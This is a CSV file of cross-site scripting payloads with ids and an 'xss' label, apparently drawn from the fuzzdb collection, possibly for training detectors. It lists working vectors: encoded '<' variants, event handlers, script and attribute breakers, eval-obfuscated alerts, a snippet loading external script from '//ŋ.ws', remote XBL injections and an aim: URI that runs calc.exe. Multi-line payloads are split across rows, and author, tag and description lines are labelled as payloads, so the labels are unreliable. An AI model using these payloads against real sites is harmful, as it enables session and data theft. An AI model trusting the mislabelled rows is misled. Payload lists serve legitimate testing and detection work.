id,payload,label
fuzzdb_356,&#X003c;,xss
fuzzdb_357,&#X0003c;,xss
fuzzdb_358,&#X00003c;,xss
fuzzdb_359,&#X000003c;,xss
fuzzdb_360,&#x3C,xss
fuzzdb_361,&#x03C,xss
fuzzdb_362,&#x003C,xss
fuzzdb_363,&#x0003C,xss
fuzzdb_364,&#x00003C,xss
fuzzdb_365,&#x000003C,xss
fuzzdb_366,&#x3C;,xss
fuzzdb_367,&#x03C;,xss
fuzzdb_368,&#x003C;,xss
fuzzdb_369,&#x0003C;,xss
fuzzdb_370,&#x00003C;,xss
fuzzdb_371,&#x000003C;,xss
fuzzdb_372,&#X3C,xss
fuzzdb_373,&#X03C,xss
fuzzdb_374,&#X003C,xss
fuzzdb_375,&#X0003C,xss
fuzzdb_376,&#X00003C,xss
fuzzdb_377,&#X000003C,xss
fuzzdb_378,&#X3C;,xss
fuzzdb_379,&#X03C;,xss
fuzzdb_380,&#X003C;,xss
fuzzdb_381,&#X0003C;,xss
fuzzdb_382,&#X00003C;,xss
fuzzdb_383,&#X000003C;,xss
fuzzdb_384,\x3c,xss
fuzzdb_385,\x3C,xss
fuzzdb_386,\u003c,xss
fuzzdb_387,\u003C,xss
fuzzdb_388,onAbort,xss
fuzzdb_389,onBlur,xss
fuzzdb_390,onChange,xss
fuzzdb_391,onClick,xss
fuzzdb_392,onDblClick,xss
fuzzdb_393,onDragDrop,xss
fuzzdb_394,onError,xss
fuzzdb_395,onFocus,xss
fuzzdb_396,onKeyDown,xss
fuzzdb_397,onKeyPress,xss
fuzzdb_398,onKeyUp,xss
fuzzdb_399,onLoad,xss
fuzzdb_400,onMouseDown,xss
fuzzdb_401,onMouseMove,xss
fuzzdb_402,onMouseOut,xss
fuzzdb_403,onMouseOver,xss
fuzzdb_404,onMouseUp,xss
fuzzdb_405,onMove,xss
fuzzdb_406,onReset,xss
fuzzdb_407,onResize,xss
fuzzdb_408,onSelect,xss
fuzzdb_409,onSubmit,xss
fuzzdb_410,onabort,xss
fuzzdb_411,onactivate,xss
fuzzdb_412,onafterprint,xss
fuzzdb_413,onafterupdate,xss
fuzzdb_414,onanimationend,xss
fuzzdb_415,onanimationiteration,xss
fuzzdb_416,onanimationstart,xss
fuzzdb_417,onautocomplete,xss
fuzzdb_418,onautocompleteerror,xss
fuzzdb_419,onbeforeactivate,xss
fuzzdb_420,onbeforecopy,xss
fuzzdb_421,onbeforecut,xss
fuzzdb_422,onbeforedeactivate,xss
fuzzdb_423,onbeforeeditfocus,xss
fuzzdb_424,onbeforepaste,xss
fuzzdb_425,onbeforeprint,xss
fuzzdb_426,onbeforeunload,xss
fuzzdb_427,onbeforeupdate,xss
fuzzdb_428,onbegin,xss
fuzzdb_429,onblur,xss
fuzzdb_430,onbounce,xss
fuzzdb_431,oncancel,xss
fuzzdb_432,oncanplay,xss
fuzzdb_433,oncanplaythrough,xss
fuzzdb_434,oncellchange,xss
fuzzdb_435,onchange,xss
fuzzdb_436,onclick,xss
fuzzdb_437,onclose,xss
fuzzdb_438,oncompassneedscalibration,xss
fuzzdb_439,oncontextmenu,xss
fuzzdb_440,oncontrolselect,xss
fuzzdb_441,oncopy,xss
fuzzdb_442,oncuechange,xss
fuzzdb_443,oncut,xss
fuzzdb_444,ondataavailable,xss
fuzzdb_445,ondatasetchanged,xss
fuzzdb_446,ondatasetcomplete,xss
fuzzdb_447,ondblclick,xss
fuzzdb_448,ondeactivate,xss
fuzzdb_449,ondevicelight,xss
fuzzdb_450,ondevicemotion,xss
fuzzdb_451,ondeviceorientation,xss
fuzzdb_452,ondeviceproximity,xss
fuzzdb_453,ondrag,xss
fuzzdb_454,ondragdrop,xss
fuzzdb_455,ondragend,xss
fuzzdb_456,ondragenter,xss
fuzzdb_457,ondragexit,xss
fuzzdb_458,ondragleave,xss
fuzzdb_459,ondragover,xss
fuzzdb_460,ondragstart,xss
fuzzdb_461,ondrop,xss
fuzzdb_462,ondurationchange,xss
fuzzdb_463,onemptied,xss
fuzzdb_464,onend,xss
fuzzdb_465,onended,xss
fuzzdb_466,onerror,xss
fuzzdb_467,onerrorupdate,xss
fuzzdb_468,onexit,xss
fuzzdb_469,onfilterchange,xss
fuzzdb_470,onfinish,xss
fuzzdb_471,onfocus,xss
fuzzdb_472,onfocusin,xss
fuzzdb_473,onfocusout,xss
fuzzdb_474,onformchange,xss
fuzzdb_475,onforminput,xss
fuzzdb_476,ongesturechange,xss
fuzzdb_477,ongestureend,xss
fuzzdb_478,ongesturestart,xss
fuzzdb_479,onhashchange,xss
fuzzdb_480,onhelp,xss
fuzzdb_481,oninput,xss
fuzzdb_482,oninvalid,xss
fuzzdb_483,onkeydown,xss
fuzzdb_484,onkeypress,xss
fuzzdb_485,onkeyup,xss
fuzzdb_486,onlanguagechange,xss
fuzzdb_487,onlayoutcomplete,xss
fuzzdb_488,onload,xss
fuzzdb_489,onloadeddata,xss
fuzzdb_490,onloadedmetadata,xss
fuzzdb_491,onloadstart,xss
fuzzdb_492,onlosecapture,xss
fuzzdb_493,onmediacomplete,xss
fuzzdb_494,onmediaerror,xss
fuzzdb_495,onmessage,xss
fuzzdb_496,onmousedown,xss
fuzzdb_497,onmouseenter,xss
fuzzdb_498,onmouseleave,xss
fuzzdb_499,onmousemove,xss
fuzzdb_500,onmouseout,xss
fuzzdb_501,onmouseover,xss
fuzzdb_502,onmouseup,xss
fuzzdb_503,onmousewheel,xss
fuzzdb_504,onmove,xss
fuzzdb_505,onmoveend,xss
fuzzdb_506,onmovestart,xss
fuzzdb_507,onmozfullscreenchange,xss
fuzzdb_508,onmozfullscreenerror,xss
fuzzdb_509,onmozpointerlockchange,xss
fuzzdb_510,onmozpointerlockerror,xss
fuzzdb_511,onmsgesturechange,xss
fuzzdb_512,onmsgesturedoubletap,xss
fuzzdb_513,onmsgesturehold,xss
fuzzdb_514,onmsgesturerestart,xss
fuzzdb_515,onmsinertiastart,xss
fuzzdb_516,onmspointercancel,xss
fuzzdb_517,onmspointerdown,xss
fuzzdb_518,onmspointerenter,xss
fuzzdb_519,onmspointerhover,xss
fuzzdb_520,onmspointerleave,xss
fuzzdb_521,onmspointermove,xss
fuzzdb_522,onmspointerout,xss
fuzzdb_523,onmspointerover,xss
fuzzdb_524,onmspointerup,xss
fuzzdb_525,onoffline,xss
fuzzdb_526,ononline,xss
fuzzdb_527,onorientationchange,xss
fuzzdb_528,onoutofsync,xss
fuzzdb_529,onpagehide,xss
fuzzdb_530,onpageshow,xss
fuzzdb_531,onpaste,xss
fuzzdb_532,onpause,xss
fuzzdb_533,onplay,xss
fuzzdb_534,onplaying,xss
fuzzdb_535,onpopstate,xss
fuzzdb_536,onprogress,xss
fuzzdb_537,onpropertychange,xss
fuzzdb_538,onratechange,xss
fuzzdb_539,onreadystatechange,xss
fuzzdb_540,onreceived,xss
fuzzdb_541,onrepeat,xss
fuzzdb_542,onreset,xss
fuzzdb_543,onresize,xss
fuzzdb_544,onresizeend,xss
fuzzdb_545,onresizestart,xss
fuzzdb_546,onresume,xss
fuzzdb_547,onreverse,xss
fuzzdb_548,onrowdelete,xss
fuzzdb_549,onrowenter,xss
fuzzdb_550,onrowexit,xss
fuzzdb_551,onrowinserted,xss
fuzzdb_552,onrowsdelete,xss
fuzzdb_553,onrowsinserted,xss
fuzzdb_554,onscroll,xss
fuzzdb_555,onsearch,xss
fuzzdb_556,onseek,xss
fuzzdb_557,onseeked,xss
fuzzdb_558,onseeking,xss
fuzzdb_559,onselect,xss
fuzzdb_560,onselectionchange,xss
fuzzdb_561,onselectstart,xss
fuzzdb_562,onshow,xss
fuzzdb_563,onstalled,xss
fuzzdb_564,onstart,xss
fuzzdb_565,onstop,xss
fuzzdb_566,onstorage,xss
fuzzdb_567,onsubmit,xss
fuzzdb_568,onsuspend,xss
fuzzdb_569,onsynchrestored,xss
fuzzdb_570,ontimeerror,xss
fuzzdb_571,ontimeupdate,xss
fuzzdb_572,ontoggle,xss
fuzzdb_573,ontouchcancel,xss
fuzzdb_574,ontouchend,xss
fuzzdb_575,ontouchmove,xss
fuzzdb_576,ontouchstart,xss
fuzzdb_577,ontrackchange,xss
fuzzdb_578,ontransitionend,xss
fuzzdb_579,onunload,xss
fuzzdb_580,onurlflip,xss
fuzzdb_581,onuserproximity,xss
fuzzdb_582,onvolumechange,xss
fuzzdb_583,onwaiting,xss
fuzzdb_584,onwebkitanimationend,xss
fuzzdb_585,onwebkitanimationiteration,xss
fuzzdb_586,onwebkitanimationstart,xss
fuzzdb_587,onwebkitmouseforcechanged,xss
fuzzdb_588,onwebkitmouseforcedown,xss
fuzzdb_589,onwebkitmouseforceup,xss
fuzzdb_590,onwebkitmouseforcewillbegin,xss
fuzzdb_591,onwebkittransitionend,xss
fuzzdb_592,onwebkitwillrevealbottom,xss
fuzzdb_593,onwheel,xss
fuzzdb_594,onzoom,xss
fuzzdb_595,A very short cross browser header injection,xss
fuzzdb_596,Exploit Name: A very short cross browser header injection,xss
fuzzdb_597,Exploit String: with(document)getElementsByTagName('head')[0].appendChild(createElement('script')).src='//ŋ.ws',xss
fuzzdb_598,Exploit Description: This vector shows one of the shortest possible ways to inject external JavaScript into a website's header area.,xss
fuzzdb_599,"Exploit Tags: xss, short, header, injection",xss
fuzzdb_600,Author Name: .mario,xss
fuzzdb_601,Add onclick event hadler,xss
fuzzdb_602,Exploit Name: Add onclick event hadler,xss
fuzzdb_603,Exploit String: onclick=eval/**/(/ale/.source%2b/rt/.source%2b/(7)/.source);,xss
fuzzdb_604,Exploit Description: This vector adds an onclick event handler to a tag and appends an obfuscated JS alert.,xss
fuzzdb_605,"Exploit Tags: general, JS breaking, basic, obfuscated, user interaction",xss
fuzzdb_606,Author Name: kishor,xss
fuzzdb_607,Advanced HTML injection locator,xss
fuzzdb_608,Exploit Name: Advanced HTML injection locator,xss
fuzzdb_609,Exploit String: <s>000<s>%3cs%3e111%3c/s%3e%3c%73%3e%32%32%32%3c%2f%73%3e&#60&#115&#62&#51&#51&#51&#60&#47&#115&#62&#x3c&#x73&#x3e&#x34&#x34&#x34&#x3c&#x2f&#x73&#x3e,xss
fuzzdb_610,Exploit Description: This vector indicates HTML injections by stroked text.,xss
fuzzdb_611,"Exploit Tags: general, html breaking, injection",xss
fuzzdb_612,Author Name: .mario,xss
fuzzdb_613,Advanced XSS Locator,xss
fuzzdb_614,Exploit Name: Advanced XSS Locator,xss
fuzzdb_615,"Exploit String: ';alert(0)//\';alert(1)//"";alert(2)//\"";alert(3)//--></SCRIPT>"">'><SCRIPT>alert(4)</SCRIPT>=&{}"");}alert(6);function xss(){//",xss
fuzzdb_616,Exploit Description: Advanced XSS Locator,xss
fuzzdb_617,"Exploit Tags: general, html breaking, comment breaking, JS breaking",xss
fuzzdb_618,Author Name: .mario,xss
fuzzdb_619,Advanced XSS Locator for title-Injections,xss
fuzzdb_620,Exploit Name: Advanced XSS Locator for title-Injections,xss
fuzzdb_621,"Exploit String: ';alert(0)//\';alert(1)//"";alert(2)//\"";alert(3)//--></SCRIPT>"">'></title><SCRIPT>alert(4)</SCRIPT>=&{</title><script>alert(5)</script>}"");}",xss
fuzzdb_622,Exploit Description: This is a modified version of the XSS Locator from ha.ckers.org especially crafted to check for title injections.,xss
fuzzdb_623,"Exploit Tags: general, html breaking, comment breaking, JS breaking, title breaking",xss
fuzzdb_624,Author Name: .mario,xss
fuzzdb_625,aim: uri exploit,xss
fuzzdb_626,Exploit Name: aim: uri exploit,xss
fuzzdb_627,"Exploit String: aim: &c:\windows\system32\calc.exe"" ini=""C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat""",xss
fuzzdb_628,Exploit Description: This aim-uri executes the calc.exe on vulnerable systems,xss
fuzzdb_629,"Exploit Tags: URI exploits, gecko, injection, general",xss
fuzzdb_630,Author Name: xs-sniper,xss
fuzzdb_631,Backslash-obfuscated XBL injection - variant 1,xss
fuzzdb_632,Exploit Name: Backslash-obfuscated XBL injection - variant 1,xss
fuzzdb_633,Exploit String: <div/style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)>,xss
fuzzdb_634,Exploit Description: This vector utilizes backslashes to exploit a parsing error in gecko based browsers and injects a remote XBL.,xss
fuzzdb_635,"Exploit Tags: general, injection, gecko, style injection, XBL, obfuscated",xss
fuzzdb_636,Author Name: thespanner.co.uk,xss
fuzzdb_637,Backslash-obfuscated XBL injection - variant 2,xss
fuzzdb_638,Exploit Name: Backslash-obfuscated XBL injection - variant 2,xss
fuzzdb_639,Exploit String: <div/style=&#92&#45&#92&#109&#111&#92&#122&#92&#45&,xss
fuzzdb_640,&#92&#47&#120&#98&#108&#92&#47&#120&#98&#108&#92,xss
fuzzdb_641,&#46&#120&#109&#108&#92&#35&#120&#115&#115&#41&>,xss
fuzzdb_642,Exploit Description: This vector utilizes backslashes to exploit a parsing error in gecko based browsers and injects a remote XBL. All important characters are obfuscated by unclosed entities.,xss
fuzzdb_643,"Exploit Tags: general, injection, gecko, style injection, XBL, obfuscated",xss
fuzzdb_644,Author Name: thespanner.co.uk,xss
fuzzdb_645,Backslash-obfuscated XBL injection - variant 3,xss
fuzzdb_646,Exploit Name: Backslash-obfuscated XBL injection - variant 3,xss
fuzzdb_647,Exploit String: <Q%^&*(£@!’” style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)>,xss
fuzzdb_648,Exploit Description: This vector utilizes backslashes to exploit a parsing error in gecko based browsers and injects a remote XBL. As we can see gecko based browsers accept various characters as valid tags.,xss
fuzzdb_649,"Exploit Tags: general, injection, gecko, style injection, XBL, obfuscated",xss
fuzzdb_650,Author Name: thespanner.co.uk,xss
fuzzdb_651,Backslash-obfuscated XBL injection - variant 4,xss
fuzzdb_652,Exploit Name: Backslash-obfuscated XBL injection - variant 4,xss
fuzzdb_653,Exploit String: <div&nbsp &nbsp style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)>,xss
fuzzdb_654,Exploit Description: This vector utilizes backslashes to exploit a parsing error in gecko based browsers and injects a remote XBL. Furthermore unclosed NBSP entities are used to obfuscate the string.,xss
fuzzdb_655,"Exploit Tags: general, injection, gecko, style injection, XBL, obfuscated",xss
fuzzdb_656,Author Name: thespanner.co.uk,xss
fuzzdb_657,Backslash-obfuscated XBL injection - variant 5,xss
fuzzdb_658,Exploit Name: Backslash-obfuscated XBL injection - variant 5,xss
fuzzdb_659,Exploit String: <x/style=-m\0o\0z\0-b\0i\0nd\0i\0n\0g\0:\0u\0r\0l\0(\0/\0/b\0u\0s\0i\0ne\0s\0s\0i\0nf\0o\0.c\0o\0.\0u\0k\0/\0la\0b\0s\0/\0x\0b\0l\0/\0x\0b\0l\0.\0x\0m\0l\0#\0x\0s\0s\0)>,xss
fuzzdb_660,Exploit Description: This vector utilizes backslashes to exploit a parsing error in gecko based browsers and injects a remote XBL. Between any character of the original payload null bytes are used to obfuscate.,xss
fuzzdb_661,"Exploit Tags: general, injection, gecko, style injection, XBL, obfuscated",xss
fuzzdb_662,Author Name: thespanner.co.uk,xss
fuzzdb_663,BASE,xss
fuzzdb_664,Exploit Name: BASE,xss
fuzzdb_665,"Exploit String: <BASE HREF=""javascript:alert('XSS');//"">",xss
fuzzdb_666,"Exploit Description: Works in IE and Netscape 8.1 in safe mode.  You need the // to comment out the next characters so you won't get a JavaScript error and your XSS tag will render.  Also, this relies on the fact that the website uses dynamically placed images like ”images/image.jpg” rather than full paths.  If the path includes a leading forward slash like ”/images/image.jpg” you can remove one slash from this vector (as long as there are two to begin the comment this will work",xss
fuzzdb_667,"Exploit Tags: general, evil tags",xss
fuzzdb_668,Author Name: ha.ckers.org,xss
fuzzdb_669,Basic back ticked attribute breaker,xss
fuzzdb_670,Exploit Name: Basic back ticked attribute breaker,xss
fuzzdb_671,Exploit String: `> <script>alert(5)</script>,xss
fuzzdb_672,Exploit Description: This vector breaks back ticked attributes.,xss
fuzzdb_673,"Exploit Tags: general, html breaking, basic",xss
fuzzdb_674,Author Name: kishor,xss
fuzzdb_675,Basic double quoted attribute breaker,xss
fuzzdb_676,Exploit Name: Basic double quoted attribute breaker,xss
fuzzdb_677,Exploit String: > <script>alert(4)</script>,xss
fuzzdb_678,Exploit Description: This vector breaks double quoted attributes and produces an alert.,xss
fuzzdb_679,"Exploit Tags: general, html breaking",xss
fuzzdb_680,Author Name: kishor,xss
fuzzdb_681,Basic JS breaker,xss
fuzzdb_682,Exploit Name: Basic JS breaker,xss
fuzzdb_683,Exploit String: xyz onerror=alert(6);,xss
fuzzdb_684,Exploit Description: This vector just fits between script tags and fires an alerts.,xss
fuzzdb_685,"Exploit Tags: general, JS breaking, basic",xss
fuzzdb_686,Author Name: kishor,xss
fuzzdb_687,Basic JS breaker variant 1,xss
fuzzdb_688,Exploit Name: Basic JS breaker variant 1,xss
fuzzdb_689,Exploit String: 1;a=eval;b=alert;a(b(/c/.source));,xss
fuzzdb_690,Exploit Description: This vector breaks JS integer assignments.,xss
fuzzdb_691,"Exploit Tags: general, JS breaking, basic, obfuscated",xss
fuzzdb_692,Author Name: kishor,xss
fuzzdb_693,Basic JS breaker variant 2,xss
fuzzdb_694,Exploit Name: Basic JS breaker variant 2,xss
fuzzdb_695,Exploit String: 1];a=eval;b=alert;a(b(17));//,xss
fuzzdb_696,Exploit Description: This vector breaks JS integer assignments in arrays.,xss
fuzzdb_697,"Exploit Tags: general, JS breaking, basic, obfuscated",xss
fuzzdb_698,Author Name: kishor,xss
fuzzdb_699,Basic JS breaker variant 3,xss
fuzzdb_700,Exploit Name: Basic JS breaker variant 3,xss
fuzzdb_701,Exploit String: ];a=eval;b=alert;a(b(16));//,xss
fuzzdb_702,Exploit Description: This vector breaks JS when placed in double quoted arrays.,xss
fuzzdb_703,"Exploit Tags: general, JS breaking",xss
fuzzdb_704,Author Name: kishor,xss
fuzzdb_705,Basic JS breaker variant 4,xss
fuzzdb_706,Exploit Name: Basic JS breaker variant 4,xss
fuzzdb_707,Exploit String: '];a=eval;b=alert;a(b(15));//,xss
fuzzdb_708,Exploit Description: This vector breaks JS when embedded in single quoted arrays.,xss
fuzzdb_709,"Exploit Tags: general, JS breaking, basic, obfuscated",xss
fuzzdb_710,Author Name: kishor,xss
fuzzdb_711,Basic JS breaker variant 5,xss
fuzzdb_712,Exploit Name: Basic JS breaker variant 5,xss
fuzzdb_713,Exploit String: 1};a=eval;b=alert;a(b(14));//,xss
fuzzdb_714,Exploit Description: JS literal object breaker for integer properties.,xss
fuzzdb_715,"Exploit Tags: general, JS breaking, basic, obfuscated",xss
fuzzdb_716,Author Name: kishor,xss
fuzzdb_717,Basic JS breaker variant 6,xss
fuzzdb_718,Exploit Name: Basic JS breaker variant 6,xss
fuzzdb_719,Exploit String: '};a=eval;b=alert;a(b(13));//,xss
fuzzdb_720,Exploit Description: JS breaker for literal objects with single quoted string properties.,xss
fuzzdb_721,"Exploit Tags: general, JS breaking, basic, obfuscated",xss
fuzzdb_722,Author Name: kishor,xss
fuzzdb_723,Basic JS breaker variant 7,xss
fuzzdb_724,Exploit Name: Basic JS breaker variant 7,xss
fuzzdb_725,Exploit String: };a=eval;b=alert;a(b(12));//,xss
fuzzdb_726,Exploit Description: JS breaker for literal objects with double quoted string properties.,xss
fuzzdb_727,"Exploit Tags: general, JS breaking",xss
fuzzdb_728,Author Name: kishor,xss
fuzzdb_729,Basic JS breaker variant 8,xss
fuzzdb_730,Exploit Name: Basic JS breaker variant 8,xss
fuzzdb_731,Exploit String: a=1;a=eval;b=alert;a(b(11));//,xss
fuzzdb_732,Exploit Description: Can be used when JS can be injected directly.,xss
fuzzdb_733,"Exploit Tags: general, JS breaking, basic, obfuscated",xss
fuzzdb_734,Author Name: kishor,xss
fuzzdb_735,Basic JS breaker variant 9,xss
fuzzdb_736,Exploit Name: Basic JS breaker variant 9,xss
fuzzdb_737,Exploit String: ;//%0da=eval;b=alert;a(b(10));//,xss
fuzzdb_738,"Exploit Description: Breaks double quoted strings, injects a comment, carriage return and finally an alert.",xss
fuzzdb_739,"Exploit Tags: general, JS breaking, CRLF",xss
fuzzdb_740,Author Name: kishor,xss
fuzzdb_741,Basic JS breaker variant 10,xss
fuzzdb_742,Exploit Name: Basic JS breaker variant 10,xss
fuzzdb_743,Exploit String: ';//%0da=eval;b=alert;a(b(9));//,xss
fuzzdb_744,"Exploit Description: Breaks single quoted strings, injects a comment, carriage return and finally an alert.",xss
fuzzdb_745,"Exploit Tags: general, JS breaking, basic, obfuscated, CRLF",xss
fuzzdb_746,Author Name: kishor,xss
fuzzdb_747,Basic single quoted attribute breaker,xss
fuzzdb_748,Exploit Name: Basic single quoted attribute breaker,xss
fuzzdb_749,Exploit String: '> <script>alert(3)</script>,xss
fuzzdb_750,Exploit Description: This vector breaks single quoted attributes and appends an alert.,xss
fuzzdb_751,"Exploit Tags: general, html breaking, basic",xss
fuzzdb_752,Author Name: kishor,xss
fuzzdb_753,Basic title breaker,xss
fuzzdb_754,Exploit Name: Basic title breaker,xss
fuzzdb_755,Exploit String: </title><script>alert(1)</script>,xss
fuzzdb_756,Exploit Description: This basic vector breaks HTML titles and injects JavaScript.,xss
fuzzdb_757,"Exploit Tags: general, html breaking, basic, title breaking",xss
fuzzdb_758,Author Name: kishor,xss
fuzzdb_759,BGSOUND,xss
fuzzdb_760,Exploit Name: BGSOUND,xss
fuzzdb_761,"Exploit String: <BGSOUND SRC=""javascript:alert('XSS');"">",xss
fuzzdb_762,Exploit Description: BGSOUND,xss
fuzzdb_763,"Exploit Tags: general, evil tags",xss
fuzzdb_764,Author Name: ha.ckers.org,xss
fuzzdb_765,BODY background-image,xss
fuzzdb_766,Exploit Name: BODY background-image,xss
fuzzdb_767,"Exploit String: <BODY BACKGROUND=""javascript:alert('XSS');"">",xss
fuzzdb_768,Exploit Description: BODY image,xss
fuzzdb_769,"Exploit Tags: general, evil tags",xss
fuzzdb_770,Author Name: ha.ckers.org,xss
fuzzdb_771,BODY ONLOAD,xss
fuzzdb_772,Exploit Name: BODY ONLOAD,xss
fuzzdb_773,Exploit String: <BODY ONLOAD=alert('XSS')>,xss
fuzzdb_774,Exploit Description: BODY tag (I like this method because it doesn't require using any variants of ”javascript:” or ”<SCRIPT...” to accomplish the XSS attack),xss
fuzzdb_775,"Exploit Tags: general, evil tags",xss
fuzzdb_776,Author Name: ha.ckers.org,xss
fuzzdb_777,Camouflaged comment injection with JS link,xss
fuzzdb_778,Exploit Name: Camouflaged comment injection with JS link,xss
fuzzdb_779,Exploit String: <!--,xss
fuzzdb_780,"<A href=""",xss
fuzzdb_781,- --><a href=javascript:alert:document.domain,xss
fuzzdb_782,>test-->,xss
fuzzdb_783,Exploit Description: This vector evades filters by camouflaging as a comment and inhabiting a JS link.,xss
fuzzdb_784,"Exploit Tags: general, obfuscated, comment breaking, internet explorer",xss
fuzzdb_785,Author Name: thespanner.co.uk,xss
fuzzdb_786,Case Insensitive,xss
fuzzdb_787,Exploit Name: Case Insensitive,xss
fuzzdb_788,Exploit String: <IMG SRC=JaVaScRiPt:alert('XSS')>,xss
fuzzdb_789,Exploit Description: Case insensitive XSS attack vector.,xss
fuzzdb_790,"Exploit Tags: general, evil tags, obfuscated",xss
fuzzdb_791,Author Name: ha.ckers.org,xss
fuzzdb_792,Character Encoding Example,xss
fuzzdb_793,Exploit Name: Character Encoding Example,xss
fuzzdb_794,Exploit String: <%3C&lt&lt;&LT&LT;&#60&#060&#0060&#00060&#000060&#0000060&#60;&#060;&#0060;&#00060;&#000060;&#0000060;&#x3c&#x03c&#x003c&#x0003c&#x00003c&#x000003c&#x3c;&#x03c;&#x003c;&#x0003c;&#x00003c;&#x000003c;&#X3c&#X03c&#X003c&#X0003c&#X00003c&#X000003c&#X3c;&#X03c;&#X003c;&#X0003c;&#X00003c;&#X000003c;&#x3C&#x03C&#x003C&#x0003C&#x00003C&#x000003C&#x3C;&#x03C;&#x003C;&#x0003C;&#x00003C;&#x000003C;&#X3C&#X03C&#X003C&#X0003C&#X00003C&#X000003C&#X3C;&#X03C;&#X003C;&#X0003C;&#X00003C;&#X000003C;\x3c\x3C\u003c\u003C,xss
fuzzdb_795,"Exploit Description: All of the possible combinations of the character ”<” in HTML and JavaScript.  Most of these won't render, but many of them can get rendered in certain circumstances (standards are great, aren't they?).",xss
fuzzdb_796,"Exploit Tags: general, evil tags, obfuscated",xss
fuzzdb_797,Author Name: ha.ckers.org,xss
fuzzdb_798,Closing JS Tag in JS String assignment,xss
fuzzdb_799,Exploit Name: Closing JS Tag in JS String assignment,xss
fuzzdb_800,Exploit String: <script>,xss
fuzzdb_801,"var a = ""</script> <script> alert('XSS !'); </script> <script>"";",xss
fuzzdb_802,</script>,xss
fuzzdb_803,"Exploit Description: For some reason, Firefox picks up the script closing tag in the quoted string and then proceeds to process the remaining script tags as code.",xss
